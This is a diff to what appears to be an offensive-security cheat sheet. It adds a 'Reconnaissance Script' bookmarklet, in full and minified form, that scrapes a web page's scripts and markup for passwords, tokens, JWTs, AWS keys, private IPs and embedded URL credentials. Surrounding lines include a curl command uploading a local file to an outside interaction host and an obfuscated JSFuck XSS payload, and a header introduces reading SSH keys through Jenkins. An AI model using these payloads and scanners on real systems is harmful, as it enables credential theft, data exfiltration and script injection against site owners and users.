@@ -1329,6 +1329,75 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 <img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
 ```
 
+### Reconnaissance Script
+
+```c
+javascript:(function(){
+    var scripts = document.getElementsByTagName("script");
+    const patterns = {
+        credentials: /pass(word|wd|phrase)|secret|token|api[-_]?key|auth|credential|private[-_]key/gi,
+        jwt: /(eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,})/g,
+        ips: /(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g,
+        awsKeys: /(AKIA|ASIA)[A-Z0-9]{16}/g,
+        emails: /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,
+        urlSecrets: /(https?:\/\/[^:\/]+:[^@\/]+@)/g
+    };
+    
+    const results = {};
+    
+    function scanText(t, loc) {
+        Object.entries(patterns).forEach(([name, regex]) => {
+            let m;
+            while ((m = regex.exec(t)) !== null) {
+                if (!results[loc]) results[loc] = [];
+                if (results[loc].indexOf(m[0]) === -1) results[loc].push(m[0]);
+            }
+        });
+    }
+    
+    for (let i = 0; i < scripts.length; i++) {
+        let s = scripts[i];
+        if (s.src) {
+            fetch(s.src)
+                .then(r => r.text())
+                .then(t => {
+                    scanText(t, s.src);
+                })
+                .catch(e => console.error(e));
+            if (s.textContent.trim() !== "") scanText(s.textContent, s.src + " (inline fallback)");
+        } else {
+            scanText(s.textContent, "inline script #" + (i + 1));
+        }
+    }
+    
+    scanText(document.body.innerHTML, document.location.href);
+    
+    function showResults() {
+        let total = 0;
+        Object.values(results).forEach(arr => {
+            total += arr.length;
+        });
+        
+        document.write('<h3>Found ' + total + ' potential secret(s) across ' + Object.keys(results).length + ' location(s):</h3>');
+        
+        Object.entries(results).forEach(([loc, secrets]) => {
+            document.write('<h4>Location: <code>' + loc + '</code></h4>');
+            secrets.forEach(sec => {
+                document.write('<code>' + sec + '</code><br>');
+            });
+        });
+    }
+    
+    setTimeout(showResults, 5000);
+})();
+```
+
+or
+
+```c
+javascript:(function(){var scripts=document.getElementsByTagName("script");const patterns={credentials:/pass(word|wd|phrase)|secret|token|api[-_]?key|auth|credential|private[-_]key/gi,jwt:/(eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,})/g,ips:/(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g,awsKeys:/(AKIA|ASIA)[A-Z0-9]{16}/g,emails:/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,urlSecrets:/(https?:\/\/[^:\/]+:[^@\/]+@)/g};const results={};function scanText(t,loc){Object.entries(patterns).forEach(([name,regex])=>{let m;while((m=regex.exec(t))!==null){if(!results[loc])results[loc]=[];if(results[loc].indexOf(m[0])===-1)results[loc].push(m[0])}})}for(let i=0;i<scripts.length;i++){let s=scripts[i];if(s.src){fetch(s.src).then(r=>r.text()).then(t=>{scanText(t,s.src)}).catch(e=>console.error(e));if(s.textContent.trim()!=="")scanText(s.textContent,s.src+" (inline fallback)") } else {scanText(s.textContent,"inline script #"+(i+1))}};scanText(document.body.innerHTML,document.location.href);function showResults(){let total=0;Object.values(results).forEach(arr=>{total+=arr.length});document.write('<h3>Found '+total+' potential secret(s) across '+Object.keys(results).length+' location(s):</h3>');Object.entries(results).forEach(([loc,secrets])=>{document.write('<h4>Location: <code>'+loc+'</code></h4>');secrets.forEach(sec=>{document.write('<code>'+sec+'</code><br>')})})}setTimeout(showResults,5000)})();
+```
+
 ## Jenkins
 
 ### Read SSH Keys through Pipelines
